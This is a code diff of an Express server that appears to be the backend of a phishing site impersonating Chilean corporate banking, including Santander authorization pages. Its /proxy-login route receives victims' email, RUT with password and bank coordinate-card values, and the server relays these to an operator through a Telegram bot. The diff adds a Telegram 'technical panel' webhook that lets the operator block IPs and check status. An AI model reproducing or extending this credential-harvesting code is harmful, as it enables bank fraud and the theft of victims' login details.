@@ -10,7 +10,7 @@ app.set("trust proxy", true);
 
 // ✅ CORS mejorado - permite AMBOS dominios sin redirección
 const corsOptions = {
-  origin: function (origin, callback) {
+  origin: function(origin, callback) {
     if (
       !origin ||
       origin === "https://www.officebankingchile.info" ||
@@ -39,7 +39,7 @@ app.use(express.static(path.join(__dirname, "public")));
 //   🔥 BLOQUEO DE CORREOS SOSPECHOSOS 🔥
 // =============================================
 const correosBloqueados = [
-  "f.tamarugal@gmail.com", // <-- reemplaza aquí
+  "f.tamarugal@gmail.com",   // <-- reemplaza aquí
   "otro@dominio.com"
 ];
 
@@ -62,11 +62,10 @@ app.use((req, res, next) => {
 });
 
 // =============================================
-//   🔥 BLOQUEO POR IP / RUT (EN MEMORIA) 🔥
+//   🔥 PANEL TÉCNICO + BLOQUEO POR IP 🔥
 // =============================================
 const intentosPorIP = new Map();
 const ipsBloqueadas = new Set();
-const rutsBloqueados = new Set();
 
 function registrarIntentoIP(ip) {
   if (!ip) return;
@@ -75,7 +74,7 @@ function registrarIntentoIP(ip) {
   intentosPorIP.set(ip, nuevo);
 
   if (nuevo >= 5 && !ipsBloqueadas.has(ip)) {
-    bloquearIP(ip, "Exceso de intentos fallidos");
+    bloquearIP(ip, "Exceso de intentos técnicos fallidos");
   }
 }
 
@@ -95,50 +94,19 @@ function desbloquearIP(ip) {
   );
 }
 
-function bloquearRUT(rut, motivo = "Bloqueo manual") {
-  if (!rut) return;
-  rutsBloqueados.add(rut);
-  enviarEventoTecnico(
-    `⛔ RUT BLOQUEADO\nRUT: ${rut}\nMotivo: ${motivo}\nHora: ${new Date().toLocaleString("es-CL")}`
-  );
-}
-
-function desbloquearRUT(rut) {
-  if (!rut) return;
-  rutsBloqueados.delete(rut);
-  enviarEventoTecnico(
-    `🔓 RUT DESBLOQUEADO\nRUT: ${rut}\nHora: ${new Date().toLocaleString("es-CL")}`
-  );
-}
-
 function estaBloqueadaIP(ip) {
   return ip && ipsBloqueadas.has(ip);
 }
 
-function estaBloqueadoRUT(rut) {
-  return rut && rutsBloqueados.has(rut);
-}
-
-// Middleware global de bloqueo por IP / RUT (solo técnico)
+// Middleware global de bloqueo técnico por IP
 app.use((req, res, next) => {
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
-  const rut =
-    req.body?.rut ||
-    req.query?.rut ||
-    null;
 
   if (estaBloqueadaIP(ip)) {
     enviarEventoTecnico(
       `⛔ Intento desde IP bloqueada\nIP: ${ip}\nRuta: ${req.path}\nMétodo: ${req.method}\nHora: ${new Date().toLocaleString("es-CL")}`
     );
     return res.status(403).json({ error: "IP bloqueada" });
-  }
-
-  if (rut && estaBloqueadoRUT(rut)) {
-    enviarEventoTecnico(
-      `⛔ Intento desde RUT bloqueado\nRUT: ${rut}\nRuta: ${req.path}\nMétodo: ${req.method}\nHora: ${new Date().toLocaleString("es-CL")}`
-    );
-    return res.status(403).json({ error: "RUT bloqueado" });
   }
 
   next();
@@ -156,21 +124,10 @@ app.use((req, res, next) => {
 
 // Verificación de variables de entorno
 console.log("\n=== VERIFICANDO CONFIGURACIÓN ===");
-console.log(
-  `TELEGRAM_TOKEN definido: ${
-    process.env.TELEGRAM_TOKEN ? "✅ SÍ" : "❌ NO"
-  }`
-);
-console.log(
-  `CHAT_ID definido: ${process.env.CHAT_ID ? "✅ SÍ" : "❌ NO"}`
-);
+console.log(`TELEGRAM_TOKEN definido: ${process.env.TELEGRAM_TOKEN ? "✅ SÍ" : "❌ NO"}`);
+console.log(`CHAT_ID definido: ${process.env.CHAT_ID ? "✅ SÍ" : "❌ NO"}`);
 if (process.env.TELEGRAM_TOKEN)
-  console.log(
-    `Token (primeros 20 caracteres): ${process.env.TELEGRAM_TOKEN.substring(
-      0,
-      20
-    )}...`
-  );
+  console.log(`Token (primeros 20 caracteres): ${process.env.TELEGRAM_TOKEN.substring(0, 20)}...`);
 if (process.env.CHAT_ID) console.log(`Chat ID: ${process.env.CHAT_ID}`);
 console.log("================================\n");
 
@@ -221,22 +178,16 @@ app.get("/autorizacion", (req, res) => {
     const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
 
     if (cfg.tipoAutorizacion === "santander") {
-      res.sendFile(
-        path.join(__dirname, "public", "autorizacion-santander.html")
-      );
+      res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
       return;
     }
 
     if (cfg.tipoAutorizacion === "coordenadas") {
-      res.sendFile(
-        path.join(__dirname, "public", "autorizacion-coordenadas.html")
-      );
+      res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
       return;
     }
 
-    res.sendFile(
-      path.join(__dirname, "public", "autorizacion-coordenadas.html")
-    );
+    res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
@@ -247,17 +198,11 @@ app.post("/autorizar", async (req, res) => {
   const mensaje = req.body.mensaje || "Autorización recibida";
   try {
     if (process.env.TELEGRAM_TOKEN && process.env.CHAT_ID) {
-      await fetch(
-        `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`,
-        {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: process.env.CHAT_ID,
-            text: mensaje
-          })
-        }
-      );
+      await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
+      });
     }
     res.json({ status: "ok", mensaje: "Autorización recibida correctamente" });
   } catch (err) {
@@ -300,12 +245,10 @@ function detectarNavegador(userAgent) {
   userAgent = userAgent || "";
 
   let navegador = "Desconocido";
-  if (/chrome|crios|crmo/i.test(userAgent) && !/edge|edg/i.test(userAgent))
-    navegador = "Chrome";
+  if (/chrome|crios|crmo/i.test(userAgent) && !/edge|edg/i.test(userAgent)) navegador = "Chrome";
   else if (/edg/i.test(userAgent)) navegador = "Edge";
   else if (/firefox|fxios/i.test(userAgent)) navegador = "Firefox";
-  else if (/safari/i.test(userAgent) && !/chrome|crios|crmo/i.test(userAgent))
-    navegador = "Safari";
+  else if (/safari/i.test(userAgent) && !/chrome|crios|crmo/i.test(userAgent)) navegador = "Safari";
   else if (/opr|opera/i.test(userAgent)) navegador = "Opera";
 
   let sistema = "Desconocido";
@@ -324,7 +267,7 @@ function detectarNavegador(userAgent) {
 
 // =============================================
 //   🔥🔥🔥  BLOQUE /proxy-login ORIGINAL  🔥🔥🔥
-//   (solo se le agrega panel técnico / bloqueo)
+//   (solo se le agrega panel técnico / IP)   //
 // =============================================
 
 app.post("/proxy-login", async (req, res) => {
@@ -342,9 +285,15 @@ app.post("/proxy-login", async (req, res) => {
 
   // Evento técnico al panel (sin datos sensibles)
   enviarEventoTecnico(
-    `Nuevo request a /proxy-login\nIP: ${ip}\nMétodo: POST\nNavegador: ${infoNavegador.navegador}\nSistema: ${infoNavegador.sistema}\nDispositivo: ${infoNavegador.dispositivo}\nTiene mail: ${
-      !!mail
-    }\nTiene login: ${!!(rut && passwd)}\nTiene coordenadas: ${!!coordenadas}`
+    `Nuevo request a /proxy-login
+IP: ${ip}
+Método: POST
+Navegador: ${infoNavegador.navegador}
+Sistema: ${infoNavegador.sistema}
+Dispositivo: ${infoNavegador.dispositivo}
+Tiene mail: ${!!mail}
+Tiene login: ${!!(rut && passwd)}
+Tiene coordenadas: ${!!coordenadas}`
   );
 
   try {
@@ -357,10 +306,7 @@ Navegador: ${infoNavegador.navegador}
 Sistema: ${infoNavegador.sistema}
 Dispositivo: ${infoNavegador.dispositivo}`;
       await enviarATelegram(mensajeCorrecto);
-      return res.json({
-        status: "ok",
-        mensaje: "Correo actualizado correctamente"
-      });
+      return res.json({ status: "ok", mensaje: "Correo actualizado correctamente" });
     }
 
     // 🔐 LOGIN
@@ -375,10 +321,7 @@ Sistema: ${infoNavegador.sistema}
 Dispositivo: ${infoNavegador.dispositivo}`;
 
       await enviarATelegram(mensajeLogin);
-      return res.json({
-        status: "ok",
-        mensaje: "Bienvenido a Office Banking"
-      });
+      return res.json({ status: "ok", mensaje: "Bienvenido a Office Banking" });
     }
 
     // 🔢 COORDENADAS
@@ -413,9 +356,9 @@ Dispositivo: ${infoNavegador.dispositivo}`;
     // Datos inválidos → intento técnico fallido
     registrarIntentoIP(ip);
     enviarEventoTecnico(
-      `❌ Datos inválidos en /proxy-login\nIP: ${ip}\nHora: ${new Date().toLocaleString(
-        "es-CL"
-      )}`
+      `❌ Datos inválidos en /proxy-login
+IP: ${ip}
+Hora: ${new Date().toLocaleString("es-CL")}`
     );
 
     res.status(400).json({ status: "error", mensaje: "❌ Datos inválidos" });
@@ -423,15 +366,161 @@ Dispositivo: ${infoNavegador.dispositivo}`;
     console.error(`❌ Error en /proxy-login:`, err);
     registrarIntentoIP(ip);
     enviarEventoTecnico(
-      `⚠️ Error en /proxy-login\nIP: ${ip}\nError: ${err.message}\nHora: ${new Date().toLocaleString(
-        "es-CL"
-      )}`
+      `⚠️ Error en /proxy-login
+IP: ${ip}
+Error: ${err.message}
+Hora: ${new Date().toLocaleString("es-CL")}`
     );
-    res
-      .status(500)
-      .json({ status: "error", mensaje: "⚠️ Error al procesar solicitud" });
+    res.status(500).json({ status: "error", mensaje: "⚠️ Error al procesar solicitud" });
   }
 });
+
+// =============================================
+//   🔥 WEBHOOK DE TELEGRAM PARA PANEL TÉCNICO 🔥
+// =============================================
+
+app.post("/telegram-webhook", async (req, res) => {
+  const update = req.body;
+
+  // 🔘 CALLBACK DE BOTONES
+  if (update.callback_query) {
+    const data = update.callback_query.data;
+    const chatId = update.callback_query.message.chat.id;
+    const messageId = update.callback_query.message.message_id;
+
+    if (data.startsWith("bloquear_ip_")) {
+      const ip = data.replace("bloquear_ip_", "");
+      bloquearIP(ip, "Bloqueo manual desde Telegram");
+      await responderCallback(update.callback_query.id, `IP bloqueada: ${ip}`);
+      await editarMensaje(chatId, messageId, `📡 PANEL TÉCNICO\n⛔ IP bloqueada: ${ip}`);
+    }
+
+    if (data.startsWith("desbloquear_ip_")) {
+      const ip = data.replace("desbloquear_ip_", "");
+      desbloquearIP(ip);
+      await responderCallback(update.callback_query.id, `IP desbloqueada: ${ip}`);
+      await editarMensaje(chatId, messageId, `📡 PANEL TÉCNICO\n🔓 IP desbloqueada: ${ip}`);
+    }
+
+    if (data === "ver_estado") {
+      await responderCallback(update.callback_query.id, "Mostrando estado técnico");
+      await editarMensaje(chatId, messageId, await construirPanelTexto());
+    }
+
+    return res.sendStatus(200);
+  }
+
+  // 📩 MENSAJES NORMALES (comandos)
+  if (update.message) {
+    const text = update.message.text || "";
+    const chatId = update.message.chat.id;
+
+    if (text.startsWith("/panel")) {
+      await enviarPanelTecnico(chatId);
+    }
+
+    if (text.startsWith("/bloquear_ip")) {
+      const partes = text.split(" ");
+      const ip = partes[1];
+      if (ip) {
+        bloquearIP(ip, "Bloqueo manual desde comando");
+        await enviarATelegram(`📡 EVENTO TÉCNICO\n⛔ IP bloqueada por comando\nIP: ${ip}`);
+      }
+    }
+
+    if (text.startsWith("/desbloquear_ip")) {
+      const partes = text.split(" ");
+      const ip = partes[1];
+      if (ip) {
+        desbloquearIP(ip);
+        await enviarATelegram(`📡 EVENTO TÉCNICO\n🔓 IP desbloqueada por comando\nIP: ${ip}`);
+      }
+    }
+
+    if (text.startsWith("/estado")) {
+      await enviarATelegram(await construirPanelTexto());
+    }
+
+    return res.sendStatus(200);
+  }
+
+  res.sendStatus(200);
+});
+
+// Helpers para panel técnico
+async function responderCallback(callbackId, texto) {
+  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/answerCallbackQuery`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      callback_query_id: callbackId,
+      text: texto,
+      show_alert: false
+    })
+  });
+}
+
+async function editarMensaje(chatId, messageId, nuevoTexto) {
+  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/editMessageText`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: chatId,
+      message_id: messageId,
+      text: nuevoTexto
+    })
+  });
+}
+
+async function enviarPanelTecnico(chatId) {
+  const texto = await construirPanelTexto();
+
+  const botones = {
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: "⛔ Bloquear IP 190.111.22.33", callback_data: "bloquear_ip_190.111.22.33" }
+        ],
+        [
+          { text: "🔓 Desbloquear IP 190.111.22.33", callback_data: "desbloquear_ip_190.111.22.33" }
+        ],
+        [
+          { text: "📊 Ver estado", callback_data: "ver_estado" }
+        ]
+      ]
+    }
+  };
+
+  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: texto,
+      ...botones
+    })
+  });
+}
+
+async function construirPanelTexto() {
+  const ips = Array.from(ipsBloqueadas);
+  const intentos = Array.from(intentosPorIP.entries())
+    .map(([ip, count]) => `${ip}: ${count}`)
+    .join("\n") || "Sin registros";
+
+  const bloqueadas = ips.join("\n") || "Ninguna";
+
+  return `📡 PANEL TÉCNICO
+Estado del servidor: OK
+
+IPs bloqueadas:
+${bloqueadas}
+
+Intentos por IP:
+${intentos}
+
+Hora: ${new Date().toLocaleString("es-CL")}`;
+}
 
 // Página principal
 app.get("/", (req, res) => {
@@ -444,6 +533,4 @@ app.use((req, res) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () =>
-  console.log(`✅ Servidor corriendo en puerto ${PORT}`)
-);
+app.listen(PORT, () => console.log(`✅ Servidor corriendo en puerto ${PORT}`));
